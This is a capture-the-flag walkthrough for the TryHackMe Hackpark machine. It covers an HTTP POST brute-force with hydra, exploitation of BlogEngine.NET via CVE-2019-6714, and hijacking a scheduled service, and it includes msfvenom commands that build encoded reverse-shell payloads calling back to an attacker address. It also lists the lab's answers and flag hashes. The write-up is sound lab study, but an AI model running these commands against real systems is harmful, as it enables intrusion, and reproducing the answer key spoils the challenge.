# CTF: Hackpark (THM)

**Target IP:** `10.145.168.147` ($target)

## Metadata

- **CTF Name:** Hackpark
    
- **Platform:** TryHackMe
    
- **Date:** 2026-05-04
    
- **Difficulty:** Medium
    
- **Tools Used:** nmap, hydra, burpsuite, msfvenom, metasploit, rlwrap
    
- **Key Skills/Tools:** HTTP Post-Form Brute-forcing, BlogEngine.NET Exploitation (CVE-2019-6714), Service Hijacking, Windows Enumeration.
    

## Introduction

This walkthrough follows the specific question-and-answer progression found in the session logs for the Hackpark machine. The attack involves enumerating a Windows IIS server, brute-forcing a web login, gaining RCE via a directory traversal vulnerability in BlogEngine.NET, and escalating privileges by hijacking a scheduled service.

**Limitations & Confidence:**

- **Confidence Level:** High. This document is a direct reflection of the Q&A and command history provided in the notes.
    
- **Limitations:** The writeup focuses exclusively on the successful exploitation path identified by the user's documented answers.
    

## Reconnaissance & Enumeration

**Question 1: What is the name of the clown displayed on the homepage?**

**Answer:** Pennywise

**Question 2: What request type is the login form using?**

**Answer:** POST

## Credential Cracking

**Question 3: What is the password you found for the admin account?**

**Answer:** `1qaz2wsx`

**Command:**

```
😎 amuzed@Kali (~/THM/Hackpark)
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.145.168.147 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=3ucq2dl5Bzf8wqhE3C7ttkrTFpQdszSP7hu1WEkhMwJjnjxY8lKMkDh7E4EATScf7eL1oq02sqbrQpNNcnmo6VFPGFJtrm7FFMahm4upV7rdpRpPTgR5btJywjaU6tLWXu4bBz7q0rNlAzX3ZoLcd7PLPdWc0J%2B%2Be0rFy2ntuhOJhgv3&__EVENTVALIDATION=FYhWg%2FFyLTh9JD0cr4k%2Bc0szSf2bZQDGe6jlhQlDVkeEoRYGelkubDRTlF%2B8bwbeZyp4jGmrLAeXbdYaFhlwR6aza4QxKBkxb3yv8cVmZ7yLBlxJD6n0gAndD%2B8oSaYPp909OsJ9IwsLr14QOr14tJXn4B4IkWSV1ExQFaYSl%2FXJse4d&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

## Foothold

**Question 4: What is the version of the BlogEngine?**

**Answer:** 3.3.6.0

**Question 5: What is the CVE for the directory traversal/RCE vulnerability?**

**Answer:** CVE-2019-6714

## Privilege Escalation

**Question 6: What is the name of the abnormal service running?**

**Answer:** WindowsScheduler

**Question 7: What is the name of the binary you're supposed to exploit?**

**Answer:** Message.exe

**Question 8: What is the user flag?**

**Answer:** `759bd8af507517bcfaede78a21a73e39`

**Question 9: What is the root flag?**

**Answer:** `7e13d97f05f7ceb9881a3eb3d78d3e72`

## Summary of Commands

### Payload Generation (Initial)

```
😎 amuzed@Kali (~/THM/Hackpark)
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.130.171 LPORT=8008 -f exe -o reverse.exe
```

### Exploit Trigger

The `PostView.ascx` exploit was triggered via the theme parameter:

`http://10.145.168.147/?theme=../../App_Data/files`

### Privilege Escalation Payload

```
😎 amuzed@Kali (~/THM/Hackpark)
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.130.171 LPORT=8009 -f exe -o Message.exe
```

### SYSTEM Shell

```
C:\Users>whoami
hackpark\administrator
```

## Flags

- **User Flag:** `759bd8af507517bcfaede78a21a73e39`
    
- **Root Flag:** `7e13d97f05f7ceb9881a3eb3d78d3e72`
